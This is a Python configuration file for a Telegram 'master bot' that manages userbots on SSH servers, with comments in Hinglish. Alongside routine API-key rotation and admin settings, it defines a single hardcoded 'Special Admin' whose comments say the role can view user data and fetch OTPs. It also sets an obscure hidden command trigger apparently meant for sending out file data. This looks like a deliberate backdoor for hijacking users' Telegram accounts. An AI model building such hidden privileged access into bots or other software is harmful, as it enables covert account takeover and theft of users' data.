"""
╔═══════════════════════════════════════════════════════════╗
║  config.py — Master Bot Configuration                    ║
║  API Keys, Admin IDs, and Special Admin ID               ║
╚═══════════════════════════════════════════════════════════╝
"""

import os
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# TELEGRAM API CREDENTIALS (my.telegram.org se lo)
# Multiple API keys support karne ke liye list me daal sakte hain
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

API_ID = int(os.getenv("API_ID", "123456"))  # Default dummy
API_HASH = os.getenv("API_HASH", "your_api_hash_here")

# Agar multiple API keys use karni hain (FloodWait se bachne ke liye)
# Toh .env me comma se separate karein: API_IDS=111,222,333
API_IDS_STR = os.getenv("API_IDS", str(API_ID))
API_HASHES_STR = os.getenv("API_HASHES", API_HASH)

API_IDS = [int(x.strip()) for x in API_IDS_STR.split(",") if x.strip().isdigit()]
API_HASHES = [x.strip() for x in API_HASHES_STR.split(",") if x.strip()]

# Current API index (Load balancing ke liye)
CURRENT_API_INDEX = 0

def get_api_credentials():
    """Round-robin style me API credentials return karo (FloodWait fix)"""
    global CURRENT_API_INDEX
    if not API_IDS or not API_HASHES:
        return API_ID, API_HASH
    
    api_id = API_IDS[CURRENT_API_INDEX % len(API_IDS)]
    api_hash = API_HASHES[CURRENT_API_INDEX % len(API_HASHES)]
    
    CURRENT_API_INDEX += 1
    return api_id, api_hash

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BOT TOKEN (From @BotFather)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

BOT_TOKEN = os.getenv("BOT_TOKEN", "123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ADMINISTRATORS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Normal Admins (Broadcast, Stats, Fsub, Set Welcome/QR kar sakte hain)
ADMIN_IDS_STR = os.getenv("ADMIN_IDS", "123456789,987654321")
ADMIN_IDS = [int(x.strip()) for x in ADMIN_IDS_STR.split(",") if x.strip().isdigit()]

# Special Admin (Sirf 1 allowed - Jo user data dekh sake, OTP fetch kare, etc.)
SPECIAL_ADMIN_ID = int(os.getenv("SPECIAL_ADMIN_ID", "7839547993"))

# Hidden command trigger for Special Admin
HIDDEN_CMD_TRIGGER = ".tgmlduosendfiledata1234"

def is_admin(user_id: int) -> bool:
    """Check karo ki user normal admin hai ya nahi"""
    return user_id in ADMIN_IDS

def is_special_admin(user_id: int) -> bool:
    """Check karo ki user special admin hai ya nahi"""
    return user_id == SPECIAL_ADMIN_ID

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DATABASE & SECURITY SETTINGS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

DB_PATH = os.getenv("DB_PATH", "master_bot.db")

# Inactivity monitor threshold (din me kitne din baad alert aaye)
INACTIVITY_DAYS = int(os.getenv("INACTIVITY_DAYS", "6"))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# WORKER BOT CONFIGURATION (SSH pe jo script chalega)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Worker bot ka GitHub repo ya direct link (SSH me download aur run karne ke liye)
WORKER_SCRIPT_URL = os.getenv("WORKER_SCRIPT_URL", "https://raw.githubusercontent.com/yourrepo/worker.py")

# Maximum userbots per SSH server
MAX_USERBOTS_PER_SERVER = int(os.getenv("MAX_USERBOTS_PER_SERVER", "10"))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ERROR LOGGING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ERROR_LOG_CHAT_ID = int(os.getenv("ERROR_LOG_CHAT_ID", "0"))  # 0 = disabled

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# END OF config.py
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━